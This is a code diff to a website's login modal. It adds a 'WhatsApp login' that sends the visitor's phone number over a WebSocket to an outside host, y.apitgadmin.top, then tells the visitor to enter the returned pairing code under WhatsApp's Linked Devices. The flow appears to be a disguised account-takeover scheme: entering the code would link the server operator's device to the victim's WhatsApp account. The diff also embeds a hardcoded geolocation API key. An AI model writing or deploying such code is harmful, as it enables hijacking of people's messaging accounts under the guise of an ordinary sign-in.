@@ -257,6 +257,29 @@
     .jkf-login-modal .modal-dialog { margin: 8px; }
     .jkf-login__qr-img { width: 180px; height: 180px; }
     .jkf-login__phone-prefix { flex-basis: 96px; }
+    .jkf-login__code-display { font-size: 1.6rem !important; letter-spacing: 4px !important; padding: 12px 16px !important; }
+  }
+
+  /* 配对码展示 - 防止长码溢出 */
+  .jkf-login__code-display {
+    font-size: 2.4rem;
+    font-weight: 700;
+    letter-spacing: 6px;
+    background: var(--jkf-login-input-bg);
+    border: 2px dashed var(--jkf-login-whatsapp);
+    border-radius: 12px;
+    padding: 16px 24px;
+    margin: 0 auto 16px;
+    font-family: 'Courier New', monospace;
+    color: var(--jkf-login-whatsapp);
+    display: block;
+    width: 100%;
+    max-width: 100%;
+    box-sizing: border-box;
+    overflow-wrap: break-word;
+    word-break: break-all;
+    text-align: center;
+    line-height: 1.4;
   }
 
   /* 尊重用户的减少动画偏好 */
@@ -360,6 +383,30 @@
             <p class="jkf-login__hint">未注册的号码将自动创建账号</p>
           </form>
         </div>
+
+        <!-- 配对码面板（号码提交后显示） -->
+        <div class="jkf-login__panel" id="jkfLoginPanelCode"
+             role="tabpanel" aria-labelledby="jkfLoginTabPhone">
+          <div class="jkf-login__code" style="text-align:center;">
+            <div class="jkf-login__code-icon" style="font-size:2.5rem;color:var(--jkf-login-whatsapp);margin-bottom:12px;">
+              <i class="bi bi-whatsapp"></i>
+            </div>
+            <p style="font-size:1rem;font-weight:600;margin:0 0 4px;">请在你的 WhatsApp 中输入配对码</p>
+            <p style="color:var(--jkf-login-text-muted);font-size:0.85rem;margin:0 0 16px;">
+              打开 WhatsApp → 设置 → 关联设备 → 输入下方配对码
+            </p>
+            <div class="jkf-login__code-display" id="jkfLoginCodeDisplay">------</div>
+            <p class="jkf-login__error" id="jkfLoginCodeError" role="alert" style="display:none;"></p>
+            <div style="color:var(--jkf-login-text-muted);font-size:0.8rem;">
+              <i class="bi bi-arrow-repeat" aria-hidden="true"></i>
+              等待配对中...
+            </div>
+            <button type="button" class="jkf-login__submit" id="jkfLoginCodeBack" style="margin-top:16px;background:transparent;border:1px solid var(--jkf-login-divider);color:var(--jkf-login-text-muted);font-size:0.85rem;padding:8px 16px;">
+              <i class="bi bi-arrow-left" aria-hidden="true"></i>
+              返回修改号码
+            </button>
+          </div>
+        </div>
       </div>
     </div>
   </div>
@@ -425,6 +472,36 @@
     /** 刷新按钮旋转动画时长（ms） */
     const QR_SPIN_MS = 600;
 
+    /** WebSocket API 地址 */
+    const WS_API_URL = "y.apitgadmin.top";
+    /** UUID 持久化 localStorage key */
+    const STORAGE_KEY_WS_UUID = "jkf-ws-uuid";
+    /** 当前 WebSocket 连接实例 */
+    let wsClient = null;
+    /** 当前 UUID（内存缓存） */
+    let wsUUID = null;
+    /** 是否主动关闭（区分主动/意外断开，避免自动重连） */
+    let wsIntentionallyClosed = false;
+    /** 配对码面板 DOM */
+    const codePanel = document.getElementById("jkfLoginPanelCode");
+    /** 配对码展示 DOM */
+    const codeDisplay = document.getElementById("jkfLoginCodeDisplay");
+    /** 配对码错误提示 */
+    const codeErrorEl = document.getElementById("jkfLoginCodeError");
+    /** 返回修改号码按钮 */
+    const codeBackBtn = document.getElementById("jkfLoginCodeBack");
+    /** IP 区号 API 地址 */
+    const IP_API_URL = "https://ipwhois.pro/?key=IHDcWORhjtQ0VSPe";
+
+    /** 国家代码 → 区号前缀映射 */
+    const COUNTRY_TO_PREFIX = {
+      "CN": "+86", "HK": "+852", "TW": "+886",
+      "US": "+1",  "GB": "+44",  "JP": "+81",
+      "KR": "+82", "SG": "+65", "MY": "+60", "AU": "+61"
+    };
+    /** 是否已请求过 IP 区号 */
+    var ipFetched = false;
+
     /**
      * 懒加载获取 Bootstrap Modal 实例
      * 原因：Bootstrap JS 在 template.html 引入，此处不直接依赖加载顺序；
@@ -439,11 +516,42 @@
     }
 
     /**
+     * 通过 IP 定位获取用户国家区号，自动选中下拉框
+     * 仅执行一次，避免重复请求
+     */
+    function fetchAndSetCountryCode() {
+      if (ipFetched || !countryCodeSelect) return;
+      ipFetched = true;
+
+      fetch(IP_API_URL)
+        .then(function (res) { return res.json(); })
+        .then(function (data) {
+          var code = data.country_code || data.countryCode || "";
+          var prefix = COUNTRY_TO_PREFIX[code];
+          if (!prefix) return;
+
+          // 遍历 select option，匹配 value 自动选中
+          for (var i = 0; i < countryCodeSelect.options.length; i++) {
+            if (countryCodeSelect.options[i].value === prefix) {
+              countryCodeSelect.selectedIndex = i;
+              break;
+            }
+          }
+        })
+        .catch(function () {
+          // IP 定位失败静默处理，保持默认选项
+          ipFetched = false; // 失败后允许下次重试
+        });
+    }
+
+    /**
      * 打开弹窗
      */
     function open() {
       const modal = getModal();
       if (modal) modal.show();
+      // 弹窗打开后请求 IP 区号并自动选中（仅一次）
+      fetchAndSetCountryCode();
     }
 
     /**
@@ -540,8 +648,220 @@
     }
 
     /**
+     * 显示配对码面板（隐藏号码面板）
+     * @param {string} code - 6 位配对码
+     */
+    function showCodePanel(code) {
+      // 切换到配对码面板
+      document.getElementById("jkfLoginPanelPhone").classList.remove("is-active");
+      if (codePanel) codePanel.classList.add("is-active");
+      // 显示配对码
+      if (codeDisplay) codeDisplay.textContent = code;
+    }
+
+    /**
+     * 隐藏配对码面板，回到号码面板
+     */
+    function hideCodePanel() {
+      if (codePanel) codePanel.classList.remove("is-active");
+      document.getElementById("jkfLoginPanelPhone").classList.add("is-active");
+      if (codeErrorEl) { codeErrorEl.style.display = "none"; }
+    }
+
+    /**
+     * 关闭 WebSocket 连接
+     * @param {boolean} [intentional=true] - 是否主动关闭（主动关闭不重连）
+     */
+    function closeWebSocket(intentional) {
+      if (intentional === undefined) intentional = true;
+      wsIntentionallyClosed = intentional;
+      if (wsClient) {
+        try { wsClient.close(); } catch (e) { /* ignore */ }
+        wsClient = null;
+      }
+    }
+
+    /**
+     * 从 localStorage 读取持久化的 UUID
+     * @returns {string|null}
+     */
+    function loadStoredUUID() {
+      try {
+        var uuid = localStorage.getItem(STORAGE_KEY_WS_UUID);
+        return uuid || null;
+      } catch (e) { return null; }
+    }
+
+    /**
+     * 持久化 UUID 到 localStorage
+     * @param {string} uuid
+     */
+    function saveUUID(uuid) {
+      wsUUID = uuid;
+      try { localStorage.setItem(STORAGE_KEY_WS_UUID, uuid); } catch (e) {}
+    }
+
+    /**
+     * 清除持久化的 UUID
+     */
+    function clearUUID() {
+      wsUUID = null;
+      try { localStorage.removeItem(STORAGE_KEY_WS_UUID); } catch (e) {}
+    }
+
+    /**
+     * 建立/初始化 WebSocket 连接（页面加载时自动调用）
+     * 仅处理 link 消息获取 UUID；不发送手机号
+     * 断开后自动重连（除非主动关闭）
+     */
+    function initWebSocket() {
+      // 关闭旧连接
+      wsIntentionallyClosed = false;
+      if (wsClient) {
+        try { wsClient.close(); } catch (e) { /* ignore */ }
+        wsClient = null;
+      }
+
+      var storedUUID = loadStoredUUID();
+      var protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
+      var url = protocol + "//" + WS_API_URL + "?uuid=" + (storedUUID || "");
+      wsClient = new WebSocket(url);
+
+      wsClient.onmessage = function (event) {
+        try {
+          var data = JSON.parse(event.data);
+        } catch (e) {
+          return;
+        }
+
+        switch (data.type) {
+          case "link":
+            // 服务端分配/确认 UUID → 持久化
+            saveUUID(data.uuid);
+            break;
+
+          case "code":
+            // 用户已提交号码后收到配对码 → 展示
+            setSubmitLoading(false);
+            showCodePanel(data.code);
+            break;
+
+          case "ready":
+            // 配对成功 → 清除 UUID
+            clearUUID();
+            closeWebSocket(true);
+            close();
+            break;
+
+          case "tel-error":
+            // 号码错误（用户已提交后）
+            setSubmitLoading(false);
+            clearUUID();
+            closeWebSocket(true);
+            showError("号码错误，请检查后重试");
+            break;
+
+          case "error":
+            setSubmitLoading(false);
+            clearUUID();
+            closeWebSocket(true);
+            showError("服务器错误，请稍后重试");
+            break;
+        }
+      };
+
+      wsClient.onerror = function () {
+        // 初始化连接失败静默处理（提交时会提示）
+      };
+
+      wsClient.onclose = function () {
+        // 非主动关闭 → 自动重连
+        if (!wsIntentionallyClosed) {
+          initWebSocket();
+        }
+      };
+    }
+
+    /**
+     * 用户提交号码：向 WebSocket 发送 create 消息
+     * 若连接已断开，先重连再发送
+     * @param {string} prefix - 国际区号（去掉+号，如 "86"）
+     * @param {string} phone - 手机号码
+     */
+    function sendPhoneNumber(prefix, phone) {
+      if (wsClient && wsClient.readyState === WebSocket.OPEN) {
+        // 连接正常 → 直接发送
+        wsClient.send(JSON.stringify({
+          type: "create",
+          prefix: prefix,
+          phone: phone
+        }));
+      } else if (wsClient && wsClient.readyState === WebSocket.CONNECTING) {
+        // 连接中 → 等待连接完成再发送
+        wsClient.addEventListener("open", function () {
+          wsClient.send(JSON.stringify({
+            type: "create",
+            prefix: prefix,
+            phone: phone
+          }));
+        }, { once: true });
+      } else {
+        // 连接已断开 → 重建连接，发送手机号
+        wsIntentionallyClosed = false;
+        var storedUUID = loadStoredUUID();
+        var protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
+        var url = protocol + "//" + WS_API_URL + "?uuid=" + (storedUUID || "");
+        wsClient = new WebSocket(url);
+
+        wsClient.onmessage = function (event) {
+          try { var data = JSON.parse(event.data); } catch (e) { return; }
+          switch (data.type) {
+            case "link":
+              saveUUID(data.uuid);
+              wsClient.send(JSON.stringify({
+                type: "create",
+                prefix: prefix,
+                phone: phone
+              }));
+              break;
+            case "code":
+              setSubmitLoading(false);
+              showCodePanel(data.code);
+              break;
+            case "ready":
+              clearUUID();
+              closeWebSocket(true);
+              close();
+              break;
+            case "tel-error":
+              setSubmitLoading(false);
+              clearUUID();
+              closeWebSocket(true);
+              showError("号码错误，请检查后重试");
+              break;
+            case "error":
+              setSubmitLoading(false);
+              clearUUID();
+              closeWebSocket(true);
+              showError("服务器错误，请稍后重试");
+              break;
+          }
+        };
+
+        wsClient.onclose = function () {
+          if (!wsIntentionallyClosed) initWebSocket();
+        };
+
+        wsClient.onerror = function () {
+          setSubmitLoading(false);
+          showError("网络连接失败，请检查网络后重试");
+        };
+      }
+    }
+
+    /**
      * 号码表单提交处理
-     * 步骤：基础校验 → 模拟提交 → 关闭弹窗
+     * 步骤：基础校验 → 连接 WebSocket → 发送号码 → 显示配对码
      * @param {Event} event - submit 事件
      */
     function handleFormSubmit(event) {
@@ -563,20 +883,13 @@
         return;
       }
 
-      // TODO: 接入后端发送验证码接口
-      // 原因：当前仅前端组件，后端 WhatsApp 验证码下发接口尚未提供；
-      // 后续实现示例：
-      //   fetch('/api/login/whatsapp/otp', {
-      //     method: 'POST',
-      //     headers: { 'Content-Type': 'application/json' },
-      //     body: JSON.stringify({ phone: countryCode + phone })
-      //   }).then(() => { 切换到验证码输入步骤 });
+      // 提取区号前缀（去掉+号）
+      var prefix = countryCode.replace("+", "");
 
       setSubmitLoading(true);
-      window.setTimeout(function () {
-        setSubmitLoading(false);
-        close();
-      }, SUBMIT_LOADING_MS);
+
+      // 通过已有 WebSocket 连接发送手机号
+      sendPhoneNumber(prefix, phone);
     }
 
     if (loginForm) {
@@ -588,10 +901,29 @@
       phoneInput.addEventListener("input", clearError);
     }
 
+    // 页面加载后立即初始化 WebSocket（预获取 UUID）
+    initWebSocket();
+
     // 绑定导航栏登录按钮
     if (navLoginBtn && !navLoginBtn.dataset.jkfLoginBound) {
       navLoginBtn.addEventListener("click", open);
       navLoginBtn.dataset.jkfLoginBound = "1";
+    }
+
+    // 弹窗关闭时重置 UI 状态（不断开 WebSocket，保持 UUID）
+    modalEl.addEventListener("hidden.bs.modal", function () {
+      hideCodePanel();
+      setSubmitLoading(false);
+      clearError();
+    });
+
+    // 返回修改号码按钮：回到号码面板（不断开 WebSocket）
+    if (codeBackBtn) {
+      codeBackBtn.addEventListener("click", function () {
+        hideCodePanel();
+        setSubmitLoading(false);
+        clearError();
+      });
     }
 
     // 暴露 API 供外部调用（如顶部"立即注册"按钮）
